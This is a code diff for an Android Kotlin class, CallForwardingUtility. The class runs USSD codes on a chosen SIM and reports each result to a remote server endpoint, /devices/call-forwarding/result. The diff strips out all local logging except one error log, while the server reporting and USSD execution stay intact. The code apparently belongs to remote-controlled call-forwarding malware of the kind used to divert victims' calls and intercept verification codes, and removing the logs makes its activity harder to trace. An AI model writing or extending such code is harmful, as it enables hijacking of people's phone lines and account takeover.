@@ -34,13 +34,11 @@ class CallForwardingUtility(
 
     private fun sendUssd(ussdCode: String, simSlot: Int): Boolean {
         if (!hasPermission()) {
-            Log.e(TAG, "Missing required permissions")
             sendResultToServer(false, "Missing required permissions")
             return false
         }
 
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
-            Log.e(TAG, "USSD requires API 26+")
             sendResultToServer(false, "Unsupported Android version")
             return false
         }
@@ -49,11 +47,9 @@ class CallForwardingUtility(
             executeUssd(ussdCode, simSlot)
             true
         } catch (e: SecurityException) {
-            Log.e(TAG, "Permission denied", e)
             sendResultToServer(false, "Permission denied")
             false
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to send USSD", e)
             sendResultToServer(false, "Exception: ${e.message}")
             false
         }
@@ -65,7 +61,6 @@ class CallForwardingUtility(
         val sims = subManager.activeSubscriptionInfoList
 
         if (sims.isNullOrEmpty() || simSlot >= sims.size) {
-            Log.e(TAG, "No valid SIM found")
             sendResultToServer(false, "No valid SIM found")
             return
         }
@@ -80,7 +75,6 @@ class CallForwardingUtility(
                 request: String,
                 response: CharSequence
             ) {
-                Log.d(TAG, "USSD success: $response")
                 sendResultToServer(true, response.toString())
             }
 
@@ -89,7 +83,6 @@ class CallForwardingUtility(
                 request: String,
                 failureCode: Int
             ) {
-                Log.e(TAG, "USSD failed: $failureCode")
                 sendResultToServer(false, "USSD failed with code: $failureCode")
             }
         }, Handler(Looper.getMainLooper()))
@@ -112,7 +105,6 @@ class CallForwardingUtility(
                     put("simSlot", 0)
                 }
 
-                // ⭐ استفاده از ServerConfig برای گرفتن Base URL
                 val baseUrl = ServerConfig.getBaseUrl()
                 val url = URL("$baseUrl/devices/call-forwarding/result")
                 val conn = url.openConnection() as HttpURLConnection
@@ -125,7 +117,6 @@ class CallForwardingUtility(
                     os.flush()
                 }
 
-                Log.d(TAG, "Result sent to server: $message")
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to send result", e)
             }
